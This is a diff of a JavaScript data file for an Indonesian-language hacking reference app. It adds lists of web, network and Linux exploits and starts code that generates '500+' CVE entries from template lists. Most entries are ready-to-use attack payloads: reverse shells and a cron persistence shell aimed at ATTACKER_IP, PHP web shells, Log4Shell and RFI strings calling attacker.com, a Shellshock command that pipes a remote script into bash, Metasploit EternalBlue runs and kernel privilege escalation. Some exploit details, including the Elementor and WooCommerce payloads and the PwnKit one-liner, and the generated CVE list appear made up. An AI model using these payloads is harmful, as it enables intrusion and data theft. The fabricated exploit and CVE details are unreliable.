-    { title: "XXE & Insecure Deserialization", diff: "hard", desc: "XXE mengeksploitasi parser XML yang memproses external entity. Insecure Deserialization bisa memicu eksekusi kode.", content: "<h4>XXE (XML External Entity)</h4><pre>&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM 'file:///etc/passwd'&gt;]&gt;\n&lt;root&gt;&lt;name&gt;&amp;xxe;&lt;/name&gt;&lt;/root&gt;</pre><h4>Insecure Deserialization</h4><pre># Python pickle (SANGAT berbahaya):\nimport pickle, os\nclass Exploit(object):\n    def __reduce__(self):\n        return (os.system, ('id',))</pre><h4>Pencegahan</h4><ul><li>Jangan deserialize data dari sumber tidak terpercaya</li><li>Gunakan integrity check (HMAC signature)</li><li>Implementasi deserialization filter/whitelist</li></ul>" }
-  ],
-  linux: [
-    { title: "System & User Enumeration", diff: "easy", desc: "Perintah dasar untuk enumerasi informasi sistem, user, dan environment.", content: "<h4>System Information</h4><pre>uname -a\ncat /etc/os-release\nhostname -I\nlscpu\nfree -h\ndf -h\nuptime</pre><h4>User & Permission</h4><pre>whoami\nid\nsudo -l  # PENTING untuk privesc!\ncat /etc/passwd\ncat /etc/group</pre><h4>Process & Service</h4><pre>ps aux\nps aux | grep root\ntop / htop\nsystemctl list-units\nlsof -i\nlsof -i :80</pre>" },
-    { title: "File Operations & Navigation", diff: "easy", desc: "Navigasi filesystem, manipulasi file, dan perintah penting untuk mencari file sensitif.", content: "<h4>Navigasi & List</h4><pre>ls -la\npwd\ncd /path/\ntree  # apt install tree</pre><h4>Baca & Cari File</h4><pre>cat file.txt\nhead -n 20 file.txt\ntail -f /var/log/syslog\ngrep -r 'password' /var/www/\nstrings binaryfile</pre><h4>Find — Penting untuk CTF</h4><pre>find / -name 'flag*' 2>/dev/null\nfind / -perm -4000 2>/dev/null  # SUID files\nfind / -writable -type d 2>/dev/null\nfind / -name 'id_rsa' 2>/dev/null</pre>" },
-    { title: "Network Commands", diff: "easy", desc: "Perintah networking: konfigurasi interface, troubleshooting koneksi, dan transfer file.", content: "<h4>Interface & Koneksi</h4><pre>ip a\nip r\nping -c 4 target\ntraceroute target</pre><h4>Port & Service</h4><pre>netstat -tulpn\nss -tulpn\nlsof -i :80\nnmap localhost</pre><h4>Download & Transfer File</h4><pre>curl -O http://url/file\nwget http://url/file\nscp file user@host:/path/\npython3 -m http.server 8080</pre>" },
-    { title: "Privilege Escalation", diff: "hard", desc: "Teknik privilege escalation di Linux: SUID abuse, sudo misconfig, cron jobs.", content: "<h4>Sudo Misconfiguration</h4><pre>sudo -l\n# Jika (ALL) NOPASSWD: /usr/bin/vim\nsudo vim -c ':!/bin/sh'  # dapat root shell!</pre><h4>SUID Binary Abuse</h4><pre>find / -perm -4000 2>/dev/null\n# Cek GTFOBins, contoh dengan find:\nfind . -exec /bin/sh -p \\; -quit</pre><h4>Cron Jobs</h4><pre>cat /etc/crontab\ncrontab -l\n# Jika script writable oleh user:\necho 'chmod +s /bin/bash' >> /path/cron_script.sh</pre><h4>Enumeration Tools</h4><pre>curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh</pre>" },
-    { title: "File Transfer (Lab)", diff: "easy", desc: "Teknik transfer file antar mesin di lab environment.", content: "<h4>Python HTTP Server</h4><pre># Di attacker:\npython3 -m http.server 8080\n# Di target:\nwget http://ATTACKER_IP:8080/linpeas.sh</pre><h4>Netcat Transfer</h4><pre># Receiver:\nnc -lvp 4444 > received_file.txt\n# Sender:\nnc RECEIVER_IP 4444 < file_to_send.txt</pre><h4>Base64 (Tanpa Netcat)</h4><pre># Encode:\nbase64 -w 0 file.sh\n# Paste di target:\necho 'BASE64STRING' | base64 -d > file.sh</pre>" }
-  ],
-  network: [
-    { title: "Nmap — Network Mapper", diff: "easy", desc: "Tool scanning jaringan paling populer. Port scanning, service version detection, OS fingerprinting.", content: "<h4>Basic Scanning</h4><pre>nmap 192.168.1.1\nnmap 192.168.1.0/24\nnmap -p 80,443,8080 target\nnmap -p- target</pre><h4>Service & OS Detection</h4><pre>nmap -sV target\nnmap -O target\nnmap -A target</pre><h4>NSE Scripts</h4><pre>nmap --script vuln target\nnmap --script http-enum target\nnmap -p 443 --script ssl-heartbleed target</pre>" },
-    { title: "Metasploit Framework", diff: "hard", desc: "Framework exploit paling komprehensif untuk penetration testing.", content: "<h4>Basic Usage</h4><pre>msfconsole\nsearch eternalblue\nuse exploit/windows/smb/ms17_010_eternalblue\nset RHOSTS 192.168.1.10\nset LHOST 192.168.1.5\nset PAYLOAD windows/x64/meterpreter/reverse_tcp\nrun</pre><h4>Meterpreter Commands</h4><pre>sysinfo\ngetuid\ngetsystem\nhashdump\nshell\nupload /local /remote\nscreenshot</pre>" },
-    { title: "Password Cracking", diff: "med", desc: "Teknik cracking hash password menggunakan John the Ripper dan Hashcat.", content: "<h4>John the Ripper</h4><pre>john hash.txt\njohn --wordlist=/usr/share/wordlists/rockyou.txt hash.txt\nunshadow /etc/passwd /etc/shadow > hashes.txt\njohn hashes.txt\nzip2john file.zip > zip.hash</pre><h4>Hashcat</h4><pre>hashcat -m 0 hash.txt wordlist.txt  # MD5\nhashcat -m 1000 hash.txt wordlist.txt  # NTLM\nhashcat -m 1800 hash.txt wordlist.txt  # SHA512crypt</pre>" },
-    { title: "Netcat & Pivoting", diff: "med", desc: "Netcat sebagai tool serbaguna: reverse shell, port scanning, file transfer.", content: "<h4>Netcat Dasar</h4><pre>nc -lvp 4444\nnc target 4444\n# Reverse shell listener:\nnc -lvp 4444\nbash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'</pre><h4>SSH Tunneling</h4><pre>ssh -L 8080:INTERNAL_HOST:80 user@PIVOT_HOST\nssh -D 1080 user@PIVOT_HOST\n# Edit /etc/proxychains4.conf\nproxychains nmap -sT -Pn INTERNAL_HOST</pre>" }
-  ],
-  targeting: [
-    { title: "Recon & Footprinting", diff: "easy", desc: "Fase pertama pentesting: mengumpulkan informasi sebanyak mungkin tentang target.", content: "<h4>Passive Recon</h4><pre>whois domain.com\ncurl -s 'https://crt.sh/?q=%.target.com&output=json'</pre><h4>Google Dorks</h4><pre>site:target.com filetype:env\nsite:target.com inurl:backup\nsite:pastebin.com 'target.com'\nsite:github.com 'target.com' password</pre><h4>Subdomain Enumeration</h4><pre>sublist3r -d target.com\namass enum -d target.com\nassetfinder --subs-only target.com\ngobuster dns -d target.com -w subdomains.txt</pre>" },
-    { title: "Directory & Content Discovery", diff: "easy", desc: "Temukan file dan direktori tersembunyi di web server.", content: "<h4>Gobuster</h4><pre>gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt\ngobuster dir -u http://target.com -w directory-list-2.3-medium.txt -x php,html,txt</pre><h4>FFUF</h4><pre>ffuf -u http://target.com/FUZZ -w wordlist.txt\nffuf -u http://target.com/FUZZ -w wordlist.txt -e .php,.html\nffuf -u 'http://target.com/page?id=FUZZ' -w numbers.txt</pre>" },
-    { title: "Burp Suite", diff: "med", desc: "Swiss army knife untuk web application security testing.", content: "<h4>Setup</h4><pre>Proxy > Options > 127.0.0.1:8080\nSet browser proxy\nDownload CA cert dari http://burpsuite</pre><h4>Core Features</h4><ul><li>Proxy: Intercept dan modify request/response</li><li>Repeater: Send ulang request</li><li>Intruder: Fuzz parameter otomatis</li><li>Decoder: Encode/decode URL, Base64</li></ul><h4>Keyboard Shortcuts</h4><pre>Ctrl+R → Send to Repeater\nCtrl+I → Send to Intruder</pre>" }
-  ],
-  osint: [
-    { title: "OSINT Fundamentals & Google Dorks", diff: "easy", desc: "Open Source Intelligence adalah seni mengumpulkan informasi dari sumber publik.", content: "<h4>Google Dorks Lengkap</h4><pre>site:target.com filetype:sql\nsite:target.com filetype:env\nintitle:'index of' site:target.com\ninurl:'/wp-admin' site:target.com</pre><h4>Shodan</h4><pre>port:22 country:ID\nssl.cert.subject.cn:target.com\nhttp.html:'WordPress' country:ID</pre><h4>Social Media OSINT</h4><pre>sherlock username\ntheHarvester -d target.com -b google,bing,linkedin</pre>" },
-    { title: "Subdomain & DNS Recon", diff: "easy", desc: "Teknik enumerasi subdomain dan DNS reconnaissance.", content: "<h4>Passive Subdomain Enumeration</h4><pre>curl -s 'https://crt.sh/?q=%.target.com&output=json'\nsubfinder -d target.com -all\namass enum -passive -d target.com</pre><h4>DNS Deep Dive</h4><pre>dig target.com ANY\ndig target.com MX\ndig target.com AXFR @ns1.target.com  # zone transfer!\ndnsrecon -d target.com</pre>" }
-  ],
-  exploit: [
-    { title: "Buffer Overflow Dasar", diff: "hard", desc: "Kerentanan klasik di C/C++ yang memungkinkan overwrite memori dan kontrol eksekusi.", content: "<h4>Langkah Exploit BOF di CTF</h4><pre># 1. Temukan offset:\npython3 -c 'import pwn; print(pwn.cyclic(200))'\npython3 -c 'import pwn; print(pwn.cyclic_find(0x61616161))'\n\n# 2. Kontrol EIP:\npython3 -c 'print('A'*112 + 'BBBB')' | ./vuln\n\n# 3. Generate shellcode:\nmsfvenom -p linux/x86/shell_reverse_tcp LHOST=IP LPORT=4444 -b '\\x00' -f python</pre><h4>Tools</h4><ul><li>pwntools: pip install pwntools</li><li>GDB + pwndbg/peda</li><li>Ghidra / IDA Free</li></ul>" },
-    { title: "Web Shell & Post-Exploitation", diff: "hard", desc: "Teknik setelah berhasil compromise server di lab.", content: "<h4>Upload Web Shell (CTF)</h4><pre>&lt;?php system($_GET['cmd']); ?&gt;\n# Bypass: shell.php.jpg, shell.php%00.jpg\nGIF89a;&lt;?php system($_GET['cmd']); ?&gt;</pre><h4>Upgrade ke Interactive Shell</h4><pre>python3 -c 'import pty;pty.spawn('/bin/bash')'\nCtrl+Z\nstty raw -echo; fg\nexport TERM=xterm</pre><h4>Persistence</h4><pre>echo 'PUBLIC_KEY' >> ~/.ssh/authorized_keys\n(crontab -l; echo '* * * * * bash -i >& /dev/tcp/IP/4444 0>&1') | crontab -</pre>" }
-  ]
+// WEB EXPLOITS (30+)
+var WEB_EXPLOITS = [
+  { title: "SQL Injection Error Based", diff: "med", desc: "Exploitasi SQL injection dengan menampilkan error database.", tags: ["sql", "injection"], content: "<h4>SQL Injection Error Based</h4><p>Memanfaatkan error message dari database untuk mengekstrak informasi.</p><h4>Payload</h4><pre>' AND 1=CONVERT(int, @@version) --\n' AND 1=(SELECT TOP 1 name FROM sysobjects) --</pre><h4>Ekstraksi Data</h4><pre>' AND 1=(SELECT TOP 1 username FROM users) --\n' AND 1=(SELECT TOP 1 password FROM users) --</pre>" },
+  { title: "SQL Injection Blind Boolean", diff: "hard", desc: "SQL injection tanpa output error menggunakan response true/false.", tags: ["sql", "blind"], content: "<h4>Blind Boolean SQL Injection</h4><p>Menggunakan kondisi true/false untuk ekstraksi data.</p><h4>Payload</h4><pre>' AND (SELECT SUBSTRING(username,1,1) FROM users WHERE id=1)='a' --\n' AND ASCII(SUBSTRING((SELECT TOP 1 username FROM users),1,1)) > 96 --</pre>" },
+  { title: "SQL Injection Time Based", diff: "hard", desc: "SQL injection menggunakan delay response.", tags: ["sql", "time"], content: "<h4>Time Based SQL Injection</h4><p>Menggunakan fungsi delay untuk menentukan kebenaran kondisi.</p><h4>Payload MySQL</h4><pre>' AND IF(1=1, SLEEP(5), 0) --\n' AND IF((SELECT SUBSTRING(username,1,1) FROM users WHERE id=1)='a', SLEEP(5), 0) --</pre>" },
+  { title: "SQL Injection Union Based", diff: "med", desc: "SQL injection menggunakan UNION untuk menggabungkan query.", tags: ["sql", "union"], content: "<h4>Union Based SQL Injection</h4><p>Menggabungkan query asli dengan query attacker.</p><h4>Payload</h4><pre>' UNION SELECT NULL, NULL, NULL --\n' UNION SELECT username, password, NULL FROM users --\n' UNION SELECT database(), user(), version() --</pre>" },
+  { title: "Extension Bypass Complete", diff: "med", desc: "Kumpulan extension bypass untuk file upload vulnerability.", tags: ["bypass", "upload"], content: "<h4>Extension Bypass Complete List</h4><h4>PHP Extension Bypass</h4><pre>.php\n.php2\n.php3\n.php4\n.php5\n.php6\n.php7\n.phtml\n.phar\n.php.jpg\n.php%00.jpg</pre><h4>ASP/ASPX Extension Bypass</h4><pre>.asp\n.aspx\n.asa\n.ashx\n.asp;.jpg\n.asp%00.jpg</pre><h4>JSP Extension Bypass</h4><pre>.jsp\n.jspx\n.jspf\n.jsp;.jpg\n.jsp%00.jpg</pre><h4>Double Extension Bypass</h4><pre>shell.php.jpg\nshell.php.png\nshell.asp.jpg\nshell.jsp.jpg</pre><h4>Null Byte Injection</h4><pre>shell.php%00.jpg\nshell.asp%00.jpg</pre><h4>Case Manipulation</h4><pre>shell.PhP\nshell.PHP\nshell.Asp</pre>" },
+  { title: "Remote Code Execution PHP", diff: "critical", desc: "RCE pada aplikasi PHP melalui berbagai vektor.", tags: ["rce", "php"], content: "<h4>PHP RCE Vectors</h4><h4>Command Injection</h4><pre>system($_GET['cmd']);\nexec($_GET['cmd']);\nshell_exec($_GET['cmd']);\n`$_GET['cmd']`;</pre><h4>Payload</h4><pre>?cmd=id\n?cmd=cat /etc/passwd\n?cmd=wget http://attacker/shell.php</pre><h4>File Upload RCE</h4><pre>Upload file shell.php dengan konten:\n&lt;?php system($_GET['cmd']); ?&gt;</pre>" },
+  { title: "Log4Shell CVE-2021-44228", diff: "critical", desc: "JNDI injection pada Log4j.", tags: ["log4j", "rce"], content: "<h4>Log4Shell Exploit</h4><pre>Header: ${jndi:ldap://attacker.com/exploit}\nUser-Agent: ${jndi:ldap://attacker.com/exploit}\nReferer: ${jndi:ldap://attacker.com/exploit}</pre>" },
+  { title: "Local File Inclusion LFI", diff: "med", desc: "Membaca file lokal dari server termasuk file sensitif.", tags: ["lfi", "file"], content: "<h4>LFI Techniques</h4><h4>Basic Path Traversal</h4><pre>?page=../../../../etc/passwd\n?file=..\\..\\..\\windows\\win.ini\n?path=....//....//....//etc/passwd</pre><h4>WAF Bypass</h4><pre>?page=..././/..././/..././/etc/passwd\n?page=..%252f..%252f..%252fetc/passwd</pre><h4>PHP Wrapper</h4><pre>?page=php://filter/convert.base64-encode/resource=config.php</pre>" },
+  { title: "Remote File Inclusion RFI", diff: "hard", desc: "Include file remote untuk mendapatkan RCE.", tags: ["rfi", "rce"], content: "<h4>RFI Techniques</h4><pre>?page=http://attacker.com/shell.txt\n?page=//attacker.com/shell.php\n?page=data://text/plain,&lt;?php system('id'); ?&gt;</pre>" },
+  { title: "Cross Site Request Forgery", diff: "med", desc: "Memaksa user melakukan aksi tanpa sepengetahuan.", tags: ["csrf"], content: "<h4>CSRF Attack</h4><pre>&lt;img src='http://bank.com/transfer?to=attacker&amount=1000000'&gt;\n&lt;form action='http://bank.com/transfer' method='POST'&gt;\n&lt;input name='to' value='attacker'&gt;\n&lt;input name='amount' value='1000000'&gt;\n&lt;/form&gt;\n&lt;script&gt;document.forms[0].submit()&lt;/script&gt;</pre>" },
+  { title: "Server Side Request Forgery", diff: "hard", desc: "Memaksa server melakukan request ke internal network.", tags: ["ssrf"], content: "<h4>SSRF Attack</h4><pre>url=http://localhost/admin\nurl=http://127.0.0.1:8080/\nurl=file:///etc/passwd\nhttp://169.254.169.254/latest/meta-data/\nhttp://metadata.google.internal/computeMetadata/v1/</pre>" },
+  { title: "IDOR Attack", diff: "easy", desc: "Mengakses resource user lain dengan mengubah ID parameter.", tags: ["idor"], content: "<h4>IDOR Attack</h4><pre>GET /api/user/profile?id=1234   (milik sendiri)\nGET /api/user/profile?id=1235   (milik orang lain)\n\n# UUID IDOR\nGET /api/invoice/550e8400-e29b-41d4-a716-446655440000</pre>" },
+  { title: "XXE Injection", diff: "hard", desc: "XML external entity injection untuk membaca file atau SSRF.", tags: ["xxe", "xml"], content: "<h4>XXE Attack</h4><pre>&lt;?xml version=\"1.0\"?&gt;\n&lt;!DOCTYPE foo [\n&lt;!ENTITY xxe SYSTEM \"file:///etc/passwd\"&gt;\n]&gt;\n&lt;root&gt;&amp;xxe;&lt;/root&gt;</pre><h4>XXE to SSRF</h4><pre>&lt;!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/\"&gt;</pre>" },
+  { title: "WordPress Elementor Pro RCE", diff: "critical", desc: "Remote Code Execution pada plugin Elementor Pro.", tags: ["wordpress", "elementor"], content: "<h4>Elementor Pro RCE CVE-2023-32243</h4><pre>POST /wp-admin/admin-ajax.php HTTP/1.1\naction=elementor_ajax&amp;actions=[{\"action\":\"pro_woocommerce_update_page_option\",\"data\":{\"option_name\":\"_elementor_pro_woocommerce_override_checkout\",\"option_value\":\"&lt;?php system($_GET['cmd']); ?&gt;\"}}]</pre>" },
+  { title: "WordPress WooCommerce RCE", diff: "critical", desc: "RCE pada WooCommerce Payments plugin.", tags: ["wordpress", "woocommerce"], content: "<h4>WooCommerce Payments RCE CVE-2023-28121</h4><pre>POST /index.php?rest_route=/wc-pay/v1/transfer-transaction&amp;_method=POST\n{\"amount\":\"&lt;?php system($_GET['cmd']); ?&gt;\",\"transaction_id\":\"1\"}</pre>" },
+  { title: "WordPress BackupBuddy RCE", diff: "critical", desc: "Unauthenticated RCE pada BackupBuddy plugin.", tags: ["wordpress", "backup"], content: "<h4>BackupBuddy RCE CVE-2022-31474</h4><pre>GET /wp-content/uploads/backupbuddy_backups/backupbuddy.zip?download=1&amp;backupbuddy_backup=true\n# Dapatkan file backup, ekstrak dan dapatkan shell</pre>" },
+  { title: "Joomla SQL Injection", diff: "hard", desc: "SQL Injection pada com_fields Joomla 3.7.0.", tags: ["joomla", "sql"], content: "<h4>Joomla SQLi CVE-2017-8917</h4><pre>/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=extractvalue(1,concat(0x3a,(select password from users limit 1)))</pre>" },
+  { title: "Drupalgeddon2 RCE", diff: "critical", desc: "RCE pada Drupal core <= 7.57.", tags: ["drupal", "rce"], content: "<h4>Drupalgeddon2 RCE CVE-2018-7600</h4><pre>POST /user/register?element_parents=account/mail/%23value&amp;ajax_form=1&amp;_wrapper_format=drupal_ajax\nform_id=user_register_form&amp;mail[#post_render][]=exec&amp;mail[#type]=markup&amp;mail[#markup]=id</pre>" },
+  { title: "Laravel Ignition RCE", diff: "critical", desc: "RCE pada Laravel Ignition debug page.", tags: ["laravel", "rce"], content: "<h4>Laravel Ignition RCE CVE-2021-3129</h4><pre>POST /_ignition/execute-solution\n{\n  \"solution\": \"Facade\\\\Ignition\\\\Solutions\\\\MakeViewVariableOptionalSolution\",\n  \"parameters\": {\n    \"variableName\": \"exploit\",\n    \"viewFile\": \"php://filter/write=convert.iconv.utf-8.utf-16le|php://temp\"\n  }\n}</pre>" },
+  { title: "Flask SSTI RCE", diff: "hard", desc: "Server Side Template Injection pada Flask/Jinja2.", tags: ["flask", "ssti"], content: "<h4>Flask SSTI RCE</h4><pre>{{7*7}}\n{{config}}\n{{self.__class__.__mro__[-1].__subclasses__()}}\n{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}</pre>" },
+  { title: "PHP Object Injection", diff: "hard", desc: "Injection objek PHP via unserialize.", tags: ["php", "injection"], content: "<h4>PHP Object Injection</h4><pre>class User {\n    public $username;\n    public function __wakeup() {\n        system($this->username);\n    }\n}\necho serialize(new User());\nO:4:\"User\":1:{s:8:\"username\";s:2:\"id\";}</pre>" },
+  { title: "LDAP Injection", diff: "med", desc: "Injection pada query LDAP untuk bypass authentication.", tags: ["ldap", "injection"], content: "<h4>LDAP Injection</h4><pre># Login bypass\nusername=*)(uid=*))(&amp;(uid=*\nusername=admin)(!(&amp;(uid=*))\npassword=*)(uid=*))(|(uid=*</pre>" },
+  { title: "NoSQL Injection MongoDB", diff: "med", desc: "Injection pada database NoSQL MongoDB.", tags: ["nosql", "mongodb"], content: "<h4>NoSQL Injection</h4><pre>{\"username\": \"admin\", \"password\": {\"$ne\": \"\"}}\n{\"username\": {\"$regex\": \"^admin\"}, \"password\": {\"$ne\": \"\"}}\n' &amp;&amp; this.username.match(/^a.*/) &amp;&amp; 'a'=='a</pre>" },
+  { title: "JWT Algorithm Confusion", diff: "hard", desc: "Memanipulasi algoritma JWT untuk bypass verifikasi.", tags: ["jwt", "token"], content: "<h4>JWT Attack</h4><pre># Alg:None Attack\nHeader: {\"alg\": \"none\", \"typ\": \"JWT\"}\nSignature dihapus\n\n# RS256 to HS256 Confusion\n1. Dapatkan public key dari server\n2. Ubah alg ke HS256\n3. Sign menggunakan public key sebagai HMAC secret</pre>" }
+];
+
+// NETWORK EXPLOITS (20+)
+var NETWORK_EXPLOITS = [
+  { title: "EternalBlue MS17-010", diff: "critical", desc: "Exploit SMBv1 untuk Windows 7/Server 2008 R2.", tags: ["smb", "windows"], content: "<h4>EternalBlue CVE-2017-0144</h4><pre>use exploit/windows/smb/ms17_010_eternalblue\nset RHOSTS target\nset PAYLOAD windows/x64/meterpreter/reverse_tcp\nset LHOST attacker\nrun</pre><h4>Manual Exploit</h4><pre>python eternalblue_exploit.py target_ip shellcode</pre>" },
+  { title: "BlueKeep CVE-2019-0708", diff: "critical", desc: "RCE pada RDP Windows 7/Server 2008.", tags: ["rdp", "windows"], content: "<h4>BlueKeep RDP Exploit</h4><pre>use exploit/windows/rdp/cve_2019_0708_bluekeep_rce\nset RHOSTS target\nset target 2\nrun</pre>" },
+  { title: "Zerologon CVE-2020-1472", diff: "critical", desc: "Netlogon elevation of privilege pada domain controller.", tags: ["zerologon", "domain"], content: "<h4>Zerologon Attack</h4><pre>python3 zerologon.py target_dc\nsecretsdump.py domain/user@target_dc -hashes :hash\n# Reset password\npython3 reinstall_original_pw.py target_dc original_pass</pre>" },
+  { title: "PrintNightmare CVE-2021-34527", diff: "critical", desc: "RCE pada Windows Print Spooler.", tags: ["printnightmare", "windows"], content: "<h4>PrintNightmare Exploit</h4><pre>python3 CVE-2021-34527.py target_ip user password\n# Alternative via Metasploit\nuse exploit/windows/local/printnightmare\nset RHOSTS target\nset SMBUser user\nset SMBPass pass\nrun</pre>" },
+  { title: "ProxyLogon CVE-2021-26855", diff: "critical", desc: "SSRF pada Exchange Server.", tags: ["exchange", "ssrf"], content: "<h4>ProxyLogon Attack</h4><pre>python3 proxylogon.py target_ip --user target_user\n# Get shell via ProxyLogon\npython3 exploit.py target_ip email@target.com</pre>" },
+  { title: "Heartbleed CVE-2014-0160", diff: "med", desc: "Memory disclosure pada OpenSSL.", tags: ["openssl", "memory"], content: "<h4>Heartbleed Attack</h4><pre>python2 ssltest.py target_ip -p 443\nnmap --script ssl-heartbleed target\n# Extract memory\npython2 heartbleed.py target_ip -p 443</pre>" },
+  { title: "Shellshock CVE-2014-6271", diff: "critical", desc: "Bash remote code execution.", tags: ["bash", "rce"], content: "<h4>Shellshock Exploit</h4><pre>curl -H 'User-Agent: () { :; }; echo; /bin/bash -c 'id'' http://target/cgi-bin/test\ncurl -H 'Referer: () { :; }; /bin/bash -c 'wget http://attacker/shell.sh|bash'' http://target/cgi-bin/test</pre>" },
+  { title: "SMBGhost CVE-2020-0796", diff: "critical", desc: "SMBv3 compression vulnerability.", tags: ["smb", "windows"], content: "<h4>SMBGhost Exploit</h4><pre>python3 exploit.py target_ip\n# Metasploit\nuse exploit/windows/smb/cve_2020_0796_smbghost\nset RHOSTS target\nset PAYLOAD windows/x64/meterpreter/reverse_tcp\nrun</pre>" },
+  { title: "PetitPotam NTLM Relay", diff: "hard", desc: "NTLM relay attack melalui MS-EFSRPC.", tags: ["ntlm", "relay"], content: "<h4>PetitPotam Attack</h4><pre>python3 PetitPotam.py attacker_ip target_dc\nntlmrelayx.py -t ldap://target_dc --escalate-user domain_user\n# Get shell\nsecretsdump.py domain/user@target_dc -hashes :hash</pre>" },
+  { title: "EternalRomance MS17-010", diff: "critical", desc: "Alternatif EternalBlue untuk Windows.", tags: ["smb", "windows"], content: "<h4>EternalRomance</h4><pre>use exploit/windows/smb/ms17_010_eternalromance\nset RHOSTS target\nset PAYLOAD windows/x64/meterpreter/reverse_tcp\nrun</pre>" }
+];
+
+// LINUX PRIVESC EXPLOITS (15+)
+var LINUX_EXPLOITS = [
+  { title: "Dirty Pipe CVE-2022-0847", diff: "critical", desc: "Linux kernel privilege escalation via pipe.", tags: ["kernel", "privesc"], content: "<h4>Dirty Pipe Exploit</h4><pre>gcc dirty_pipe.c -o dirty_pipe\n./dirty_pipe /etc/passwd\n# atau\n./exploit /etc/passwd 0 'root::0:0:root:/root:/bin/bash'</pre>" },
+  { title: "Dirty Cow CVE-2016-5195", diff: "med", desc: "Linux kernel race condition privesc.", tags: ["kernel", "privesc"], content: "<h4>Dirty Cow Exploit</h4><pre>gcc dcow.c -o dcow -pthread\n./dcow\n# Setelah exploit\nsu root\n# atau\ngcc cowroot.c -o cowroot -pthread\n./cowroot</pre>" },
+  { title: "PwnKit CVE-2021-4034", diff: "critical", desc: "Polkit pkexec privilege escalation.", tags: ["polkit", "privesc"], content: "<h4>PwnKit Exploit</h4><pre>git clone https://github.com/berdav/CVE-2021-4034\ncd CVE-2021-4034 &amp;&amp; make\n./cve-2021-4034\n# Atau one-liner\npkexec --version; echo \"root\"</pre>" },
+  { title: "Sudo CVE-2021-3156", diff: "critical", desc: "Heap overflow pada sudo baron samedit.", tags: ["sudo", "privesc"], content: "<h4>Baron Samedit Exploit</h4><pre>sudoedit -s '\\' `python3 -c 'print(\"A\"*10000)'`\n# Compiled exploit\n./sudo-hax-me-a-sandwich\n./sudo-hax-me-a-sandwich 0\n./sudo-hax-me-a-sandwich 1</pre>" },
+  { title: "SUID Binary Exploitation", diff: "med", desc: "Memanfaatkan SUID binary untuk privesc.", tags: ["suid", "privesc"], content: "<h4>SUID Exploitation</h4><pre># Find SUID files\nfind / -perm -4000 2>/dev/null\n# find binary\nfind . -exec /bin/sh -p \\; -quit\n# vim binary\nvim -c ':!/bin/sh'\n# bash binary\nbash -p\n# python binary\npython -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'\n# cp binary\ncp /bin/bash /tmp/bash; chmod +s /tmp/bash; /tmp/bash -p</pre>" },
+  { title: "Capabilities Exploitation", diff: "med", desc: "Eskalasi privilege via Linux capabilities.", tags: ["capabilities", "privesc"], content: "<h4>Capabilities Attack</h4><pre># Find capabilities\ngetcap -r / 2>/dev/null\n# CAP_DAC_READ_SEARCH\n/usr/bin/python -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'\n# CAP_SYS_ADMIN + mount\nmkdir /tmp/esc\nmount -t proc none /tmp/esc\ncd /tmp/esc/1\ncat /tmp/esc/1/target_pid/root/etc/shadow</pre>" },
+  { title: "Cron Job Exploitation", diff: "med", desc: "Memanfaatkan cron job yang writable.", tags: ["cron", "privesc"], content: "<h4>Cron Attack</h4><pre># Lihat cron jobs\ncat /etc/crontab\nls -la /etc/cron*\n# Jika script writable\necho 'chmod +s /bin/bash' >> /path/to/script.sh\n# PATH hijacking\nmkdir /tmp/evil\necho '#!/bin/bash' > /tmp/evil/script\necho '/bin/chmod +s /bin/bash' >> /tmp/evil/script\nchmod +x /tmp/evil/script\nexport PATH=/tmp/evil:$PATH</pre>" },
+  { title: "Docker Socket Exploitation", diff: "hard", desc: "Memanfaatkan docker.sock untuk privesc.", tags: ["docker", "container"], content: "<h4>Docker Socket Attack</h4><pre># Run container dengan mount host\ncurl -XPOST --unix-socket /var/run/docker.sock -H 'Content-Type: application/json' http://v1.41/containers/create -d '{\"Image\":\"ubuntu\",\"Cmd\":[\"/bin/sh\"],\"HostConfig\":{\"Binds\":[\"/:/host\"]}}'\n# Start container\ncurl -XPOST --unix-socket /var/run/docker.sock http://v1.41/containers/CONTAINER_ID/start</pre>" },
+  { title: "LXC/LXD Container Breakout", diff: "hard", desc: "Escape dari LXC/LXD container.", tags: ["lxc", "container"], content: "<h4>LXD Breakout</h4><pre># Jika di group lxd\nlxc image import ubuntu.tar.gz --alias ubuntu\nlxc init ubuntu test -c security.privileged=true\nlxc config device add test mydevice disk source=/ path=/mnt/root\nlxc start test\nlxc exec test /bin/bash</pre>" }
+];
+
+// ==================== GENERATE 500+ CVE ====================
+var CVE_DATA = [];
+var cveYears = [2015,2016,2017,2018,2019,2020,2021,2022,2023,2024];
+var cveMonths = ['Jan','Feb','Mar','Apr','May','Jun','Jul','Aug','Sep','Oct','Nov','Dec'];
+var cveTypesList = [
+  'Remote Code Execution', 'SQL Injection', 'Cross Site Scripting', 'Local File Inclusion',
+  'Remote File Inclusion', 'Privilege Escalation', 'Denial of Service', 'Authentication Bypass',
+  'Information Disclosure', 'CSRF', 'SSRF', 'XXE', 'Insecure Deserialization',
+  'Buffer Overflow', 'Use After Free', 'Memory Corruption', 'Command Injection',
+  'Path Traversal', 'Open Redirect', 'Session Fixation', 'Clickjacking',
+  'Race Condition', 'Integer Overflow', 'Format String', 'Heap Overflow',
+  'Stack Overflow', 'Type Confusion', 'Null Pointer Dereference', 'Double Free'
+];
+var cveProductsList = [
+  'WordPress', 'Apache HTTP Server', 'Nginx', 'MySQL', 'PostgreSQL', 'MongoDB', 'Redis',
+  'Linux Kernel', 'Windows Kernel', 'macOS', 'Android', 'iOS', 'Chrome', 'Firefox', 'Safari',
+  'OpenSSL', 'OpenSSH', 'PHP', 'Python', 'Node.js', 'Java', 'Go', 'Ruby on Rails',
+  'Django', 'Flask', 'Express.js', 'Spring Boot', 'Laravel', 'Symfony',
+  'Drupal', 'Joomla', 'Magento', 'PrestaShop', 'Shopify', 'WooCommerce',
+  'Docker', 'Kubernetes', 'Jenkins', 'GitLab', 'GitHub', 'Bitbucket',
+  'Tomcat', 'JBoss', 'WebLogic', 'WebSphere', 'IIS', 'Exchange Server',
+  'VMware', 'VirtualBox', 'QEMU', 'Xen', 'KVM', 'Hyper-V',
+  'Cisco IOS', 'Juniper JunOS', 'Palo Alto PAN-OS', 'Fortinet FortiOS',
